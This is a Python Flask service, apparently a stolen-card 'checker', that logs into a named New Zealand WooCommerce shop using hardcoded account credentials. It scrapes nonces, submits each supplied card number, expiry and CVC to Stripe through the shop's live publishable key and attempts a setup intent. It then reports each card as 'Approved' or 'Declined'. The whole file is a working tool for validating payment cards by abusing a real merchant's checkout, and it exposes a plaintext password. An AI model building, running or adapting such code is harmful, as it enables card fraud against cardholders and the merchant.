from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup
import re

app = Flask(__name__)
session = requests.Session()

def split(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    return n, mm, yy, cvc

@app.route('/stripe_auth', methods=['GET'])
def check_card():
    cc = request.args.get('cc')
    if not cc:
        return jsonify({"error": "Missing cc parameter"}), 400

    try:
        n, mm, yy, cvc = split(cc)         
        headers = {
            'authority': 'shop.eyepro.co.nz',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        response = session.get('https://shop.eyepro.co.nz/my-account/', headers=headers)   

        soup = BeautifulSoup(response.text, 'html.parser')
        nonce = soup.find(id="woocommerce-login-nonce") 

        headers = {
            'authority': 'shop.eyepro.co.nz',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',    
            'origin': 'https://shop.eyepro.co.nz',
            'referer': 'https://shop.eyepro.co.nz/my-account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'username': 'royalgamers2010@gmail.com',
            'password': 'Sahil@123',
            'login': 'Log in',
            'woocommerce-login-nonce': nonce["value"],
            '_wp_http_referer': '/my-account/',
        }

        response = session.post('https://shop.eyepro.co.nz/my-account/', headers=headers, data=data) 

        headers = {
            'authority': 'shop.eyepro.co.nz',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',    
            'referer': 'https://shop.eyepro.co.nz/my-account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        response = session.get('https://shop.eyepro.co.nz/my-account/payment-methods/', headers=headers)    

        headers = {
            'authority': 'shop.eyepro.co.nz',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',    
            'referer': 'https://shop.eyepro.co.nz/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        response = session.get('https://shop.eyepro.co.nz/my-account/add-payment-method/', headers=headers)

        soup2 = BeautifulSoup(response.text, 'html.parser')

        script_tags = soup2.find_all('script')
        for script in script_tags:
            if script.string and "createAndConfirmSetupIntentNonce" in script.string:
                match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', script.string)
                if match:
                    ajax_nonce = match.group(1)     
                    break                      

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        data = {
            "type": "card",
            "card[number]": n,
            "card[cvc]": cvc,
            "card[exp_year]": yy,
            "card[exp_month]": mm,
            "allow_redisplay": "unspecified",
            "billing_details[address][country]": "IN",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/b524171b14; stripe-js-v3/b524171b14; payment-element; deferred-intent",
            "referrer": "https://shop.eyepro.co.nz",
            "time_on_page": "202324",
            "client_attribution_metadata[client_session_id]": "25cba23a-9c57-4109-843d-e55ff9bad2df",
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "client_attribution_metadata[elements_session_config_id]": "97826058-9711-4d8c-ab89-750cc076102c",
            "guid": "7e8704a0-17ed-4941-97ec-32de612a7623051217",
            "muid": "d95e9528-cb5d-4693-a336-b01b0ae7e05d2df621",
            "sid": "5e62009d-a678-4357-8d4a-5b691c9af06731605a",
            "key": "pk_live_51HXJ75BNphwjqAcqNxLniKwT9tTzm87qpBKv6OpGGj40ijQY6fxDNVTVPDtHvyaRkpI1q7DON9p3kukPjh7IjCPf00AGX8DWsR"
        }

        response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        
        stripe_response = response.json()
        
        if "error" in stripe_response:
            error_message = stripe_response["error"]["message"].lower()
            if "your request was in live mode, but used a known test card" in error_message:
                return jsonify({"result": "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ | Your card was declined. Your request was in live mode, but used a known test card."})          
            else:
                return jsonify({"result": f"𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ | {stripe_response['error']['message']}"})
        
        if "id" not in stripe_response:
            return jsonify({"result": f"𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ | Stripe API Error: {response.text[:100]}"})
            
        id = stripe_response["id"]               

        headers = {
            'authority': 'shop.eyepro.co.nz',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',    
            'origin': 'https://shop.eyepro.co.nz',
            'referer': 'https://shop.eyepro.co.nz/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        }

        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }

        response = session.post('https://shop.eyepro.co.nz/', params=params, headers=headers, data=data)                         
        message = response.text.lower()

        if "success" in message and "succeeded" in message:
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
            response_msg = "Payment method added successfully."
        elif "authentication_required" in message or "requires_action" in message:
            status = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
            response_msg = "3DS Action"
        elif "insufficient_funds" in message:
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ❎"
            response_msg = "Insufficient Funds"
        elif "incorrect_cvc" in message or "security code is incorrect" in message:
            status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
            response_msg = "Your card's security code is incorrect."
        elif "incorrect number" in message or "invalid number" in message or "card number is incorrect" in message:
            status = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
            response_msg = "Your card number is incorrect." 
        elif "card_declined" in message or "declined" in message:
            status = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
            response_msg = "Your card was declined"
        elif "expired" in message:
            status = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
            response_msg = "Card expired"   
        else:
            status = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
            response_msg = response.text[:100]
        
        return jsonify({"result": f"{status} | {response_msg}"})
            
    except Exception as e:
        return jsonify({"error": str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)